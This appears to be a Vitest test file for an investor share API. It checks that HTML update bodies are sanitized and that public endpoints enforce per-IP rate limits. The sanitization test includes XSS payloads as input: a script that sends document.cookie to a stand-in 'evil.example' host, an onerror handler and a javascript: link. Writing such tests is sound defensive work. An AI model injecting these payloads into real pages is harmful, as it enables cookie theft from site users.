import { describe, it, expect, vi, beforeEach } from "vitest";

// Part 40 (WS130, F125/F126): the Investor Link share API. Update bodies are sanitized before they
// leave the server, and the two public endpoints are rate limited per IP (240 page loads and 30
// view logs an hour). The real rate limiter runs against a counting fake of its table.

const state = vi.hoisted(() => ({ counters: new Map<string, number>(), views: 0 }));
const mockLink = vi.fn();
const mockUpdates = vi.fn();
vi.mock("@/lib/db", () => ({
  db: {
    shareableLink: { findUnique: (...a: unknown[]) => mockLink(...a) },
    shareableLinkView: { create: vi.fn(async () => void state.views++) },
    update: { findMany: (...a: unknown[]) => mockUpdates(...a) },
    metricValue: { findMany: vi.fn(async () => []) },
    rateLimitCounter: {
      upsert: vi.fn(async ({ where }: { where: { key_windowStart: { key: string } } }) => {
        const key = where.key_windowStart.key;
        state.counters.set(key, (state.counters.get(key) ?? 0) + 1);
        return { count: state.counters.get(key) };
      }),
      deleteMany: vi.fn(async () => ({ count: 0 })),
    },
  },
}));

import { GET } from "@/app/api/share/[token]/route";
import { POST as viewPOST } from "@/app/api/share/[token]/view/route";

const link = {
  id: "l1", label: "Q3", periodStart: new Date("2026-07-01"), periodEnd: new Date("2026-09-30"), expiresAt: null,
  metricScope: "ALL_TIME", companies: [], selectedUpdates: [{ updateId: "u1" }],
};
const update = (body: string) => ({
  id: "u1", companyId: "c1", title: "Q3 update", period: "2026-Q3", body, sentAt: new Date("2026-10-01"), createdAt: new Date("2026-10-01"),
  company: { id: "c1", name: "Acme" }, metricValues: [],
});
const get = (token = "tok", ip = "203.0.113.7") =>
  GET(new Request(`https://molly.dfs.vc/api/share/${token}`, { headers: { "x-forwarded-for": ip } }), { params: Promise.resolve({ token }) });
const view = (ip = "203.0.113.7", email = "reader@example.com") =>
  viewPOST(
    new Request("https://molly.dfs.vc/x", { method: "POST", headers: { "content-type": "application/json", "x-forwarded-for": ip }, body: JSON.stringify({ email }) }),
    { params: Promise.resolve({ token: "tok" }) }
  );

beforeEach(() => {
  state.counters = new Map();
  state.views = 0;
  mockLink.mockReset().mockResolvedValue(link);
  mockUpdates.mockReset().mockResolvedValue([update("<p>ok</p>")]);
});

describe("GET /api/share/[token]", () => {
  it("sanitizes update bodies before they leave the server, keeping honest content and the image rewrite", async () => {
    mockUpdates.mockResolvedValue([
      update(
        [
          "<p>Hello <strong>investors</strong></p>",
          "<script>fetch('https://evil.example/?c='+document.cookie)</script>",
          "<img src=x onerror=alert(1)>",
          '<a href="javascript:alert(1)">bad</a> <a href="https://example.com">good</a>',
          '<img src="/api/documents/ckabc123/view" alt="chart" class="max-w-full rounded-md my-4">',
        ].join("")
      ),
    ]);
    const res = await get("tok/en");
    expect(res.status).toBe(200);
    const json = await res.json();
    const body: string = json.updates[0].body;
    expect(body).not.toMatch(/<script|onerror|javascript:|<img src="x"/i);
    expect(body).toContain("<strong>investors</strong>");
    expect(body).toContain('<a href="https://example.com" target="_blank" rel="noopener noreferrer">good</a>');
    expect(body).toContain('<img src="/api/share/tok%2Fen/doc/ckabc123" alt="chart" class="max-w-full rounded-md my-4">');
    // response shape unchanged
    expect(Object.keys(json).sort()).toEqual(["companies", "expiresAt", "id", "label", "periodEnd", "periodStart", "theme", "updates"]);
    expect(Object.keys(json.updates[0]).sort()).toEqual(["body", "company", "companyId", "createdAt", "id", "metricValues", "period", "sentAt", "title"]);
  });

  it("rate limit: 240 an hour per IP, the 241st is a 429; another IP is unaffected", async () => {
    for (let i = 0; i < 240; i++) expect((await get("tok", "198.51.100.1")).status, `request ${i + 1}`).toBe(200);
    const over = await get("tok", "198.51.100.1");
    expect(over.status).toBe(429);
    expect((await over.json()).error).toMatch(/Too many requests/);
    expect((await get("tok", "198.51.100.2")).status).toBe(200);
  });

  it("the limit is checked before the database is read", async () => {
    for (let i = 0; i < 240; i++) await get("tok", "198.51.100.3");
    mockLink.mockClear();
    expect((await get("tok", "198.51.100.3")).status).toBe(429);
    expect(mockLink).not.toHaveBeenCalled();
  });
});

describe("POST /api/share/[token]/view", () => {
  it("rate limit: 30 an hour per IP, the 31st is a 429 and logs nothing", async () => {
    mockLink.mockResolvedValue({ id: "l1", expiresAt: null });
    for (let i = 0; i < 30; i++) expect((await view("198.51.100.4")).status, `request ${i + 1}`).toBe(200);
    expect(state.views).toBe(30);
    expect((await view("198.51.100.4")).status).toBe(429);
    expect(state.views).toBe(30);
    expect((await view("198.51.100.5")).status).toBe(200);
  });
  it("still validates the email", async () => {
    expect((await view("198.51.100.6", "nope")).status).toBe(400);
  });
});
